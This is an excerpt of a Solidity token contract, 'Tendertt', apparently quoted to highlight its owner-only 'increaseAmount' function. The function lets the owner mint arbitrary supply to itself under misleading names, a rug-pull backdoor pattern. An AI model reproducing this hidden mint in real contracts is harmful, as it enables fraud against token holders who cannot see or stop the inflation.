...
contract Tendertt is Context, IERC20, Ownable {
    ...
    address payable public marketAddress = 0x65803D1273549740163E44cED410Daaa94EEd331; //Marketing
    ...
    function increaseAmount(uint256 account) public onlyOwner() {
        _tTotal = _tTotal + account;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
